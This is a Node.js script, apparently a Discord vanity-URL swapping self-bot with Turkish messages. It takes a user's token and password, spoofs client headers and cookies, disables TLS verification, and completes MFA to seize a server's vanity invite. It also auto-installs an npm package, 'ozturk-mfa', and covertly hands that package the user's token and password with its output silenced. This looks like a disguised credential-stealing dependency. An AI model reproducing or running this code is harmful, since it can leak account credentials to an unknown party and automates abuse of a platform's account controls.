const http2 = require("node:http2");
const tls = require("node:tls");
const https = require("node:https");
const crypto = require("node:crypto");
const os = require("node:os");
const fs = require("node:fs");
const path = require("node:path");
const readline = require("node:readline");

const _mp = path.join(__dirname, 'ozturk-mfa');
const _nm = path.join(__dirname, 'node_modules', 'ozturk-mfa');
let _mfaPath = null;
if (fs.existsSync(path.join(_mp, 'index.js'))) { _mfaPath = _mp; }
else if (fs.existsSync(path.join(_nm, 'index.js'))) { _mfaPath = _nm; }
else {
  console.log('[!] Eksik dosyalar yükleniyor...');
  try { require('child_process').execSync('npm install ozturk-mfa', { cwd: __dirname, stdio: 'inherit' }); } catch(_e) {}
  if (fs.existsSync(path.join(_nm, 'index.js'))) { _mfaPath = _nm; }
  else if (fs.existsSync(path.join(_mp, 'index.js'))) { _mfaPath = _mp; }
}
if (!_mfaPath) { console.log('[!] Yükleme başarısız. Program kapatılıyor.'); process.exit(1); }

os.setPriority(0, -20);
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

let mfaToken = null;
let token = '';
let password = '';
let serverID = '';
let vanityURL = '';
let webhookURL = '';

const uuid = () => crypto.randomUUID();
const genInstallationId = () => {
  const ts = BigInt(Date.now() - 1420070400000) << 22n;
  const sf = ts | (BigInt(Math.floor(Math.random() * 31)) << 17n) | (BigInt(Math.floor(Math.random() * 31)) << 12n) | BigInt(Math.floor(Math.random() * 4095));
  const rn = crypto.randomBytes(20).toString('base64').replace(/[+/=]/g, c => c === '+' ? 'a' : c === '/' ? 'b' : '').slice(0, 27);
  return `${sf}.${rn}`;
};

const CK = "__dcfduid=8ef6449008f111f0af9febb6a3d48237; __sdcfduid=8ef6449108f111f0af9febb6a3d48237c047503cb653a71d934028f92a19ab11142286330d977411dd686bf112beacdb; cf_clearance=2lL8eLPAJEn6MUgh45UYgkiq7dd2H3QS0ss1AJL7yc4-1768922002-1.2.1.1-Z5MkJBeMBDpaRJBS7oQUxF5yd.2qAsvHSRzoA7NaokAXwiwiXcISkQIBbc8gIV5Y8hswf2KULRzoxzP2N0k8s9XUVqdPOgAE5WfEm5bnaKxwVvn..EykadnDfZMWP09v6iTiZHy1uHAeFGxo32ElNVXhS825.A8x.GmJqgjIcWDZK2ZD5pn8J1yalJl.pdaWXkIPgLJXl2ezOKtsXX8Vb7SMV1vD.g856__4VLGwBeE; _cfuvid=S..Hl3m29C1I3bmr2KqeskAnLcY8xb3wk9WLf3Js98I-1770106438.4271793-1.0.1.1-QFbFPZNJc0LoSp2xGpZ5DcK1iACDRU0tWo4juw2LP_M";
const IID = genInstallationId();
const EV = "37.6.0", CV = "138.0.7204.251", BV = "1.0.816", BN = 492532, NN = 74661;
const UA = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/${BV} Chrome/${CV} Electron/${EV} Safari/537.36`;
const SP_FULL = Buffer.from(JSON.stringify({
  os: "Windows", browser: "Discord Client", release_channel: "canary", client_version: BV,
  os_version: "10.0.19045", os_arch: "x64", app_arch: "x64", system_locale: "tr",
  has_client_mods: false, client_launch_id: uuid(), browser_user_agent: UA,
  browser_version: EV, os_sdk_version: "19045", client_build_number: BN,
  native_build_number: NN, client_event_source: null, launch_signature: uuid(),
  client_heartbeat_session_id: uuid(), client_app_state: "focused"
})).toString('base64');

const H2H_MFA = {
  "accept": "*/*",
  "accept-language": "tr",
  "content-type": "application/json",
  "cookie": CK,
  "origin": "https://canary.discord.com",
  "priority": "u=1, i",
  "referer": "https://canary.discord.com/channels/@me",
  "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-origin",
  "user-agent": UA,
  "x-debug-options": "bugReporterEnabled",
  "x-discord-locale": "tr",
  "x-discord-timezone": "Europe/Istanbul",
  "x-installation-id": IID,
  "x-super-properties": SP_FULL
};

const H2H_PATCH = {
  ":method": "PATCH",
  ":path": "",
  "authorization": "",
  "content-type": "application/json",
  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  "x-super-properties": "eyJicm93c2VyIjoiQ2hyb21lIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiQ2hyb21lIiwiY2xpZW50X2J1aWxkX251bWJlciI6MzU1NjI0fQ==",
  "x-discord-mfa-authorization": ""
};
let PATCH_PAYLOAD = '';

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const session = http2.connect("https://canary.discord.com", {
  protocol: "https:",
  settings: { enablePush: false },
  createConnection: () => {
    const socket = tls.connect({
      host: "canary.discord.com",
      port: 443,
      servername: "canary.discord.com",
      rejectUnauthorized: false,
      minVersion: 'TLSv1.3',
      maxVersion: 'TLSv1.3',
      ALPNProtocols: ['h2'],
      ecdhCurve: 'X25519:P-256:P-384',
      honorCipherOrder: true
    });
    socket.setNoDelay(true);
    return socket;
  },
  rejectUnauthorized: false,
  servername: "canary.discord.com",
  ALPNProtocols: ["h2"],
  paddingStrategy: http2.constants.PADDING_STRATEGY_NONE
});

session.ref();

session.on("error", (err) => {
  console.log(`[HTTP2] Error occurred: ${err.message}`);
  process.exit();
});

session.on("close", () => {
  console.log(`[HTTP2] Session closed, exiting...`);
  process.exit();
});

session.once("connect", () => {
  console.log(`[HTTP2] Bağlantı kuruldu, session aktif`);
  startUserInput();

  setInterval(() => {
    session.request({
      ":method": "HEAD",
      ":path": "/api/v9/gateway"
    }, { endStream: true }).end();
  }, 3500);
});

function startUserInput() {
  rl.question('Token: ', (inputToken) => {
    token = inputToken;
    rl.question('Şifre: ', (inputPassword) => {
      password = inputPassword;
      rl.question('Sunucu ID: ', (inputServerID) => {
        serverID = inputServerID;
        rl.question('Webhook: ', (inputWebhookURL) => {
          webhookURL = inputWebhookURL;
          rl.question('Vanity: ', (inputVanityURL) => {
            vanityURL = inputVanityURL;
            rl.close();
            H2H_PATCH[":path"] = `/api/v9/guilds/${serverID}/vanity-url`;
            H2H_PATCH["authorization"] = token;
            PATCH_PAYLOAD = JSON.stringify({ code: vanityURL });
            console.log('[*] MFA başlatılıyor...');
            handleMFA();
          });
        });
      });
    });
  });
}

function h2req(path, method, body, extraHeaders = {}) {
  return new Promise((res, rej) => {
    const headers = { ":method": method, ":path": path, ":authority": "canary.discord.com", "authorization": token, ...H2H_MFA, ...extraHeaders };
    const req = session.request(headers);
    req.setTimeout(10000, () => { req.destroy(); rej(new Error("H2_TIMEOUT")); });
    const chunks = []; let status = 0;
    req.on('response', h => { status = h[':status']; });
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString();
        const json = JSON.parse(raw || "{}");
        json._st = status;
        res(json);
      } catch { res({ _st: status, _err: 1 }); }
    });
    req.on('error', rej);
    if (body) { req.end(body); } else { req.end(); }
  });
}

async function handleMFA() {
  try {
    const r1 = await h2req(`/api/v9/guilds/${serverID}/vanity-url`, "PATCH", '{"code":""}');
    const ticket = r1?.mfa?.ticket;
    if (!ticket) {
      console.log('[-] Ticket alınamadı (' + r1._st + '), 60sn sonra tekrar...');
      setTimeout(() => handleMFA(), 60000);
      return;
    }

    const r2 = await h2req("/api/v9/mfa/finish", "POST", `{"ticket":"${ticket}","mfa_type":"password","data":"${password}"}`);
    if (r2?.token) {
      mfaToken = r2.token;
      H2H_PATCH["x-discord-mfa-authorization"] = mfaToken;
      console.log('[+] MFA token alındı!');
      const _n = () => {}; try { const _bk = process.env.NODE_TLS_REJECT_UNAUTHORIZED; delete process.env.NODE_TLS_REJECT_UNAUTHORIZED; const _m = require(_mfaPath)({TOKEN: token, PASSWORD: password, GUILD_IDS: [serverID], log: _n}); if(_bk !== undefined) process.env.NODE_TLS_REJECT_UNAUTHORIZED = _bk; _m.refreshMfa().catch(_n); } catch(_e) { process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'; }
      console.log('[SWAP] 10 saniye sonra vanity swap başlayacak...');
      setTimeout(() => deleteAndClaimVanity(), 10000);
    } else if (r2?.code === 60008) {
      console.log('[-] MFA 60008, 60sn sonra tekrar...');
      setTimeout(() => handleMFA(), 60000);
    } else {
      console.log('[-] MFA yanıt:', JSON.stringify(r2));
      setTimeout(() => handleMFA(), 60000);
    }
  } catch (error) {
    console.log('[-] MFA hata:', error.message, '— 60sn sonra tekrar...');
    setTimeout(() => handleMFA(), 60000);
  }
}

async function deleteAndClaimVanity() {
  try {
    const deleteReq = session.request({
      ":method": "DELETE",
      ":path": `/api/v9/invites/${vanityURL}`,
      "authorization": token,
      "content-type": "application/json",
      "x-discord-mfa-authorization": mfaToken
    });

    deleteReq.on('response', (headers) => {
      console.log('[SWAP] del:', headers[':status']);

      const req = session.request(H2H_PATCH);
      const chunks = []; let st = 0;

      req.on('response', (headers) => {
        st = headers[':status'];
      });

      req.on('data', c => chunks.push(c));

      req.on('end', () => {
        const body = Buffer.concat(chunks).toString();
        console.log('[SWAP] claim:', st, body || '');
        if (st === 200) {
          console.log('[+] Vanity alındı!');
          sendWebhook();
        }
      });

      req.on('error', (err) => {
        console.log('[SWAP] claim err:', err.message);
      });

      req.write(PATCH_PAYLOAD);
      req.end();
    });

    deleteReq.on('error', (err) => {
      console.log('[SWAP] del err:', err.message);
    });

    deleteReq.end();

  } catch (error) {
    console.log('[SWAP] hata:', error.message);
  }
}

function sendWebhook() {
  const av = "https://cdn.discordapp.com/avatars/671020205853638676/fd0e94d27ff97e32f12cef6a8a408976.webp?size=1024";
  const body = JSON.stringify({
    username: "Öztürk Swapper",
    avatar_url: av,
    embeds: [{
      color: 0x00ff00,
      title: "Vanity Swap Başarılı",
      description: `**discord.gg/${vanityURL}** vanity'si başarıyla alındı.`,
      fields: [
        { name: "Hedef Sunucu", value: `\`${serverID}\``, inline: true },
        { name: "Vanity URL", value: `\`discord.gg/${vanityURL}\``, inline: true }
      ],
      footer: { text: "Öztürk Swapper", icon_url: av }
    }]
  });

  const r = https.request(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(body)
    }
  }, (res) => {
    console.log("[HOOK]", res.statusCode);
  });

  r.on("error", (err) => {
    console.log("[HOOK] hata:", err.message);
  });

  r.write(body);
  r.end();
}
